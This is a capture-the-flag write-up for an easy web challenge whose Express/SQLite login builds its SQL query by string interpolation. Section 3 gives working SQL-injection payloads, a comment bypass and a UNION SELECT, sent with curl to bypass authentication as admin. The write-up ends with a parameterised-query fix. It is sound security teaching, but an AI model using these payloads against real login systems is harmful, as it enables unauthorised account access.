# Potent Quotes — CTF Writeup

**Event:** ADF2026 Hackathon
**Category:** Web
**Difficulty:** Easy
**Flag:** `HTB{sql_injecting_my_way_in}`

---

## 0. Summary

### Access & Environment
- Node.js/Express web application running on port 30500
- SQLite database backend (`sqlite-async`)
- Login panel with themed UI ("IMF - Login")
- Registration endpoint allowing arbitrary account creation
- Admin account seeded with a random 32-byte hex password at each migration

### Critical Findings
- **SQL Injection in login query** (Critical) — The `login()` function in `database.js` concatenates user input directly into the SQL query string with zero sanitisation. The query builder uses string interpolation: `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`. This allows an attacker to bypass authentication and retrieve the flag as the `admin` user.

### Security Implications
- Complete authentication bypass — attacker can log in as any user, including `admin`, without knowing their password
- The flag (`/app/flag`) is served upon successful admin login, exposing sensitive confidential data

---

## 1. Information Gathering

### 1.1 Target Enumeration

**Code:**
```bash
curl -s -i http://154.57.164.73:30500/
```

**Output:**
```
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /login
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 28
Date: Tue, 28 Jul 2026 23:13:11 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Found. Redirecting to /login
```

**Description:**
- The application is built on **Express** (Node.js framework)
- Root path `/` redirects to `/login`
- Standard Express headers confirm the framework

### 1.2 Endpoint Discovery

**Code:**
```bash
curl -s http://154.57.164.73:30500/register
```

**Output:**
```html
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>
  <title>IMF - Register</title>
  ...
</head>
```

**Description:**
- `/register` endpoint serves a registration page
- `/register` POST accepts `username` and `password` and creates new users
- `/login` POST accepts `username` and `password` for authentication
- The app is themed as "IMF - Login", styled with NES.css

### 1.3 Source Code Analysis (Provided Files)

Examining `challenge/database.js` revealed the critical vulnerability at line 42:

```javascript
async login(user, pass) {
    return new Promise(async (resolve, reject) => {
        try {
            let query = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
            let row = await this.db.get(query);
            resolve(row !== undefined ? row.username : false);
        } catch(e) {
            reject(e);
        }
    });
}
```

**Description:**
- The `user` and `pass` parameters are interpolated directly into the SQL string using template literals (`${}`)
- No parameterised queries, no escaping, no input sanitisation
- This is a textbook SQL injection vulnerability
- The `register()` function uses prepared statements (safe), but `login()` does not (vulnerable)

Examining `challenge/routes/index.js` (lines 23-28):

```javascript
return db.login(username, password)
    .then(user => {
        if (user == 'admin') {
            return res.send(response(fs.readFileSync('/app/flag').toString()))
        };
```

**Description:**
- The flag is read from `/app/flag` and returned when `login()` returns the username `'admin'`
- The comparison is loose (`==`), but the return value is a string username

---

## 2. Vulnerability Assessment

### 2.1 SQL Injection Confirmation

**Vulnerability:** Unauthenticated SQL injection in the `/login` POST endpoint.

**Root Cause:** String interpolation in SQL query construction in `database.js:42`.

**Attack Vector:** The `username` field is injected directly into the WHERE clause. An attacker can:
1. Terminate the username string with a single quote
2. Append SQL operators (`--` for comment, `UNION SELECT` for result manipulation)
3. Bypass the password check entirely

### 2.2 Attack Surface

| Parameter | Injection Point | Context |
|-----------|----------------|---------|
| `username` | `WHERE username = '${user}'` | String context — close with `'`, inject SQL |
| `password` | `AND password = '${pass}'` | Also injectable, but username injection is sufficient |

**Risk Level:** Critical — complete authentication bypass, sensitive data exposure (flag disclosure)

---

## 3. Exploitation

### 3.1 Attack Vector 1: Comment-Based Bypass

Inject a comment to ignore the password check:

**Code:**
```bash
curl -s http://154.57.164.73:30500/login \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin\' --","password":"anything"}'
```

**Equivalent SQL executed:**
```sql
SELECT username FROM users WHERE username = 'admin' --' and password = 'anything'
```

**Output:**
```json
{"message":"HTB{sql_injecting_my_way_in}"}
```

**Description:**
- `'` closes the username string
- `--` comments out the rest of the query (the `AND password = ...` clause)
- Since `admin` is the only user seeded at migration, the query matches and returns `'admin'`
- The route handler sees `user == 'admin'` and serves the flag

### 3.2 Attack Vector 2: UNION-Based Injection

Inject a UNION SELECT to fabricate the admin username:

**Code:**
```bash
curl -s http://154.57.164.73:30500/login \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"\' UNION SELECT \'admin\' --","password":"x"}'
```

**Equivalent SQL executed:**
```sql
SELECT username FROM users WHERE username = '' UNION SELECT 'admin' --' and password = 'x'
```

**Output:**
```json
{"message":"HTB{sql_injecting_my_way_in}"}
```

**Description:**
- `' UNION SELECT 'admin' --` closes the original username string (empty), unions a fabricated row with username `'admin'`, and comments out the password clause
- This works even if no `admin` user exists — we fabricate the result
- More robust than the comment bypass because it doesn't depend on the admin user being present

---

## 4. How We Solved It — Reasoning

### Initial Triage
The challenge provided full source code, making this a white-box assessment. We immediately scanned the three JavaScript files looking for user input handling.

### Vulnerability Discovery
The `database.js` file had two database interaction methods:
- `register()` — used **prepared statements** (`?` placeholders), **safe**
- `login()` — used **string interpolation** (`${}`), **vulnerable**

This asymmetry is a common CTF signal: when one function is parameterised and another isn't, the unparameterised one is almost certainly the attack vector.

### Why Not Blind Injection?
We considered whether a blind SQLi would be necessary (extracting the flag character-by-character). However, the route handler in `routes/index.js` revealed that successful admin login **returns the flag directly** — no need for exfiltration gymnastics. A single injection that returns `'admin'` was sufficient.

### Attack Vector Selection
Two approaches were tested:
1. **Comment bypass** (`admin' --`) — simpler, relies on the seeded admin user existing
2. **UNION injection** (`' UNION SELECT 'admin' --`) — fabricates the admin row, works regardless of database contents

Both succeeded, confirming the vulnerability from multiple angles.

### Key Insight
The **loose comparison** `user == 'admin'` on line 26 of `routes/index.js` means any truthy value resembling `'admin'` would pass. However, `sqlite.get()` returns the row object or `undefined`, so the username string `'admin'` is returned directly — no type confusion needed, just correct SQL injection.

---

## 5. Remediation

The fix is to use **parameterised queries** in the `login()` function, exactly as `register()` already does:

```javascript
async login(user, pass) {
    return new Promise(async (resolve, reject) => {
        try {
            let query = `SELECT username FROM users WHERE username = ? AND password = ?`;
            let row = await this.db.get(query, [user, pass]);
            resolve(row !== undefined ? row.username : false);
        } catch(e) {
            reject(e);
        }
    });
}
```

This uses `?` placeholders with the values passed as an array, preventing any SQL code from being interpreted from user input.